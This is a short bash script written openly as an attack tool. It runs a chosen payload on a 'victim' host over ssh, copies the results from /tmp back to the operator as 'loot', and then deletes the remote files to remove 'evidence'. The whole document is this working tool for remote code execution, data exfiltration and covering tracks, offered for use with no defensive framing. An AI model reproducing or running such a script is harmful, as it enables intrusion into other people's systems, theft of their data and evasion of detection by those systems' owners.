#!/bin/bash
# Upload a file to the victim, executes it, downloads result, and remove evidence.
# Retrieves results from /tmp directory starting with "pwned_"

# Config

DOWNLOADFROM=/tmp/pwn_
DOWNLOADTO=~/Downloads/.

# Colored Status Constants

status="\033[1m\033[94m[*]\033[0m"
good="\033[1m\033[92m[+]\033[0m"
error="\033[1m\033[91m[-]\033[0m"
money="\033[1m\033[92m[$]\033[0m"

# Check Requirements

if [[ ! -x $(which scp) ]] ||
   [[ ! -x $(which ssh) ]]; then
    echo "$error Both ssh and scp are required!" >&2
    exit 1
fi

if [[ $# -lt 1 ]]
then
	echo -e "$status Usage: $0 [payload]"
	exit 0
fi

PAYLOAD=$1

if [ -f $PAYLOAD ]
then
	echo -e "$good Successfully loaded $PAYLOAD"
else
	echo -e "$error Unable to locate $PAYLOAD. Exiting..."
	exit 1
fi

# User Input

echo -ne "$status Enter remote user: "
read USER
echo -ne "$status Enter remote IP: "
read IP

# Launch

echo -e "\n$status Connecting to remote host...\n"

ssh $USER@$IP "bash -s" < $PAYLOAD
echo -e "\n$good Payload successfully executed on remote host.\n"

scp -r $USER@$IP:$DOWNLOADFROM* $DOWNLOADTO
echo -e "\n$money Loot successfully downloaded to $DOWNLOADTO\n"

ssh $USER@$IP "rm -rf $DOWNLOADFROM*"
echo -e "\n$good Evidence successfully removed.\n"

